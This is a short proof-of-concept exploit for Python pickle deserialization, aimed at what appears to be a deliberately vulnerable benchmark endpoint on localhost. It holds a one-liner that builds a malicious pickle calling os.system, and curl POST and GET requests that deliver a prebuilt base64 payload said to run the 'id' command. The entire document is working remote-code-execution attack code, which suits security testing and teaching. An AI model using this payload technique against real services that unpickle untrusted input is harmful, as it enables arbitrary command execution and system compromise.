# Step 1: Generate malicious pickle payload
python3 -c "
import pickle, base64, os, sys

class RCE:
    def __reduce__(self):
        return (os.system, ('COMMAND_HERE',))

payload = pickle.dumps(RCE())
sys.stdout.write(base64.urlsafe_b64encode(payload).decode())
"

# Step 2: Send to the vulnerable endpoint
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=<ENCODED_PAYLOAD>'

# Example: Execute 'id' command
curl -X POST 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNpZCA-IC90bXAvcHduZWQudHh0lIWUUpQu'

# Also works with GET:
curl 'http://localhost:8443/benchmark/deserialization-00/BenchmarkTest00735?BenchmarkTest00735=gASVLgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjBNpZCA-IC90bXAvcHduZWQudHh0lIWUUpQu'